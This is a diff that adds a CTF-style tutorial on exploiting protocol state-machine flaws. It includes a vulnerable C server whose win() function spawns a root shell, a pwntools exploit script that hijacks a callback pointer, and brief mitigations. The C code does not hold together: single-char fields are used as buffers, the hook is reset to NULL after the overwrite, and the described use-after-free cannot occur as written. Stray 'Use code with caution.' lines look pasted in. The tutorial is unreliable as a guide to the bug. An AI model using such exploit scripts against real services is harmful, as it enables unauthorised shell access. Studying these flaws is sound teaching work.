@@ -1,1 +1,178 @@
 
+Protocol-State-Machine PWN targets vulnerabilities where an application implements a multi-step communication flow (like TLS, FTP, or custom financial protocols) but fails to rigorously track, restrict, or synchronize its current operational state.
+Unlike a classic buffer overflow or a single packet protocol parser bug, a state-machine exploit focuses on violating chronological transitions. By sending expected packets out of order (e.g., sending a DATA command before an AUTHENTICATE command), an attacker can force the server into unhandled states, causing it to use uninitialized memory, skip authentication checks, or misuse tracking objects.
+
+1. The Vulnerable Protocol State Machine
+
+Consider a custom stateful protocol engine used for a secure storage node. It relies on four sequential states:
+1. STATE_INIT: Setup connection.
+2. STATE_AUTH: Acknowledge login credentials.
+3. STATE_SESSION: Ready to point to memory tracking objects.
+4. STATE_COMMAND: Parse and execute commands.
+
+2. The Vulnerable C Program (state_machine.c)
+
+This server enforces state limits on some actions but introduces a flaw: when transitioning between stages, changing state modes dynamically does not clean up or revalidate existing tracking pointers.
+c
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+
+void win() {
+    printf("[+] Administrative state achieved! Launching root shell...\n");
+    system("/bin/sh");
+}
+
+typedef enum {
+    STATE_INIT,
+    STATE_AUTH,
+    STATE_SESSION,
+    STATE_COMMAND
+} server_state_t;
+
+struct user_session {
+    char username;
+    void (*process_hook)(); // Execution callback function pointer
+};
+
+// Global tracking references
+server_state_t current_state = STATE_INIT;
+struct user_session *global_session = NULL;
+
+void handle_packet() {
+    char type;
+    char packet_buffer;
+
+    while (1) {
+        printf("\n[Current State: %d] Enter Packet Type (A=Auth, S=Session, C=Cmd, R=Reset): ", current_state);
+        if (read(0, &type, 1) <= 0) break;
+        getchar(); // Clear newline
+
+        // 1. AUTHENTICATION STATE
+        if (type == 'A' && current_state == STATE_INIT) {
+            printf("Enter Username: ");
+            global_session = malloc(sizeof(struct user_session));
+            read(0, global_session->username, 32);
+            global_session->process_hook = NULL; 
+            
+            current_state = STATE_AUTH;
+            printf("[*] User identity cached.\n");
+        }
+        
+        // 2. SESSION INITIALIZATION STATE
+        else if (type == 'S' && current_state == STATE_AUTH) {
+            // Allocate a command tracking subsystem or perform security checks
+            printf("Initializing session layers...\n");
+            current_state = STATE_SESSION;
+        }
+
+        // 3. LOGICAL PROTOCOL STATE BYPASS HOOK
+        else if (type == 'R') {
+            // BUG: The developer resets the structural state machine flag back to INIT,
+            // but completely forgets to FREE or NULLify the global_session object pointer!
+            current_state = STATE_INIT;
+            printf("[-] Warning: State machine emergency reset executed.\n");
+        }
+
+        // 4. COMMAND EXECUTION STATE
+        else if (type == 'C') {
+            // LOGIC VULNERABILITY: The developer assumes that reaching STATE_SESSION 
+            // or COMMAND means a valid session was constructed. However, by manipulating 
+            // the state workflow, we can land here with a stale, hijacked, or uninitialized object.
+            if (current_state == STATE_SESSION) {
+                printf("[*] Executing session process hook...\n");
+                if (global_session && global_session->process_hook) {
+                    global_session->process_hook();
+                } else {
+                    printf("[-] Hook undefined.\n");
+                }
+            } else {
+                printf("[-] Error: System not in operational COMMAND mode.\n");
+            }
+        }
+    }
+}
+
+int main() {
+    setbuf(stdout, NULL);
+    handle_packet();
+    return 0;
+}
+Use code with caution.
+
+3. The Exploit Strategy: State Desynchronization (UAF/Type Confusion)
+
+Because the state engine allows a reset ('R') without clearing the heap memory references, an attacker can manipulate the allocation layout to align an untrusted memory overwrite directly over the functional callback variable:
+1. Step 1 ('A'): Authenticate. This creates global_session on the heap.
+2. Step 2 ('R'): Trigger the State Reset. current_state drops back to STATE_INIT, but global_session still points to that exact same live heap chunk.
+3. Step 3 ('A'): Authenticate again. Because the state is STATE_INIT, the program calls malloc() again. If we pass malicious text as the "Username" input on this second pass, our input data can completely overwrite the variables of our own persistent dangling pointer!
+4. Step 4 ('S'): Move the state to STATE_AUTH, then STATE_SESSION.
+5. Step 5 ('C'): Trigger the Command processing. The program trustingly fires global_session->process_hook(), which now contains the address of win().
+
+4. The Python State Exploit Script (state_pwn.py)
+
+Using pwntools, we script the precise logical sequence required to throw the remote engine out of chronological synchronization.
+python
+#!/usr/bin/env python3
+from pwn import *
+
+# Initialize process
+io = process('./state_machine')
+
+# Static address of our target win() function from analysis
+win_address = p32(0x080491b6)
+
+# --------------------------------------------------------
+# STAGE 1: Instantiate the initial global session block
+# --------------------------------------------------------
+io.recvuntil(b"Enter Packet Type")
+io.sendline(b"A")
+io.recvuntil(b"Enter Username: ")
+io.sendline(b"initial_guest")
+
+# --------------------------------------------------------
+# STAGE 2: Desynchronize the State Machine
+# --------------------------------------------------------
+# Force a state fallback without destroying the active memory references
+io.recvuntil(b"Enter Packet Type")
+io.sendline(b"R")
+
+# --------------------------------------------------------
+# STAGE 3: Overwrite the Callback Pointer via Data Re-entry
+# --------------------------------------------------------
+# Authenticate a second time. We craft our input data to perfectly 
+# overlay the memory location where 'process_hook' resides.
+# Offset: 32 bytes for the username array field + 4 bytes for the pointer
+payload = b"B" * 32 + win_address
+
+io.recvuntil(b"Enter Packet Type")
+io.sendline(b"A")
+io.recvuntil(b"Enter Username: ")
+io.sendline(payload)
+
+# --------------------------------------------------------
+# STAGE 4: Advance the State and Trigger Execution
+# --------------------------------------------------------
+# Elevate the state naturally to clear constraints
+io.recvuntil(b"Enter Packet Type")
+io.sendline(b"S")
+
+# Fire the corrupted execution callback hook
+io.recvuntil(b"Enter Packet Type")
+io.sendline(b"C")
+
+# Escalate straight to the interactive shell
+io.interactive()
+Use code with caution.
+
+5. Architectural Mitigations for Stateful Protocols
+
+To completely close the door on logic or state-bypassing vulnerabilities:
+• Enforce Centralized State Matrix Controls: Never rely on loosely coupled local blocks to determine transition integrity. Implement a strict, read-only state transition matrix or whitelist table:c
+// Structural enforcement rule example
+if (transition_table[current_state][incoming_packet_type] == INVALID_MOVE) {
+    terminate_session_immediately();
+}
+Use code with caution.
+• Implement Destructive Resets: Ensure any instruction that forces a structural state machine rollback or fallback performs an immediate, thorough purge of all session objects, structure states, and cached heap allocations using clear encapsulation blocks (free() and nullifying pointers).
